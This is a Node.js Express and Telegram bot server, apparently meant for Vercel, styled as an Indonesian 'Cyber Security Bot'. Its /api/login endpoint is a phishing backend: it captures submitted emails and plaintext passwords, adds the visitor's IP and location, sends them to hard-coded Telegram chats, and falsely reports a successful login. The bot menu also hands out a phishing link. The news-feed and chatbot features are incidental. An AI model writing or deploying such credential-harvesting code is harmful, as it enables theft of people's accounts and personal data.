const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const botToken = "TOKEN_BOT_TELEGRAM";
const chatIds = ["6786210993", "7894929132"]; 
const bot = new TelegramBot(botToken, { polling: true });

const rssUrl = 'https://www.securityweek.com/rss.xml';

// Fungsi Ambil Berita
const fetchSecurityNews = async () => {
    try {
        const response = await axios.get(rssUrl);
        const body = response.data;
        const $ = cheerio.load(body);
        let newsList = [];

        $('item').each((i, element) => {
            const title = $(element).find('title').text();
            const link = $(element).find('link').text();
            newsList.push({ title, link });
        });

        return newsList;
    } catch (error) {
        console.error('Error fetching news:', error);
        return [];
    }
};

// Fungsi Fetch Gemini AI
const getGeminiResponse = async (message) => {
    try {
        const response = await axios.post('https://api.gemini.com/v1/ask', {
            apiKey: 'GEMINI_API_KEY',
            query: message,
        });
        return response.data.response;
    } catch (error) {
        console.error("Error getting Gemini AI response:", error);
        return "⚠️ Maaf, aku gak bisa jawab sekarang.";
    }
};

// Endpoint Login
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const loginTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });

    let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
    try {
        let response = await axios.get("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = response.data;
    } catch (error) {
        console.error("Failed to fetch IP data:", error);
    }

    let message = `🔒 *Login Attempt!*\n\n`
        + `🕒 *Time:* ${loginTime}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Location:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}`;

    chatIds.forEach(chatId => {
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    console.log("✅ Login data sent to Telegram successfully!");
    res.json({ success: true, message: "Login successful!" });
});

// Handle Bot Telegram
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '🔥 Selamat datang di Cyber Security Bot! Ketik /menu untuk lihat opsi.');
});

bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    const photoUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";

    bot.sendPhoto(chatId, photoUrl, { caption: "📌 Pilih menu di bawah ini:" })
        .then(() => {
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🔍 TOOLS Phishing", callback_data: "TOOLS_phishing" }],
                        [{ text: "📰 Berita Keamanan", callback_data: "latest_news" }],
                        [{ text: "🤖 Gemini AI", callback_data: "ask_gemini" }],
                    ],
                },
            };
            bot.sendMessage(chatId, "📌 Pilih opsi:", opts);
        })
        .catch((error) => {
            console.error("❌ Gagal mengirim gambar:", error);
            bot.sendMessage(chatId, "⚠️ Gagal mengirim gambar. Silakan coba lagi.");
        });
});

bot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;

    if (data === "TOOLS_phishing") {
        bot.sendMessage(msg.chat.id, "🔍 Link Phishing: https://suntiksubscriber.vercel.app/");
    } else if (data === "latest_news") {
        const newsList = await fetchSecurityNews();
        if (newsList.length > 0) {
            newsList.slice(0, 5).forEach(news => {
                bot.sendMessage(msg.chat.id, `*${news.title}*\n[Read more](${news.link})`, { parse_mode: 'Markdown' });
            });
        } else {
            bot.sendMessage(msg.chat.id, "⚠️ Gak ada berita terbaru saat ini.");
        }
    } else if (data === "ask_gemini") {
        bot.sendMessage(msg.chat.id, "💬 Ketik /ai <pertanyaan> untuk ngobrol dengan Gemini AI.");
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

bot.onText(/\/ai (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userQuestion = match[1];

    const aiResponse = await getGeminiResponse(userQuestion);

    bot.sendMessage(chatId, aiResponse);
});

// Export handler buat Vercel
module.exports = app;
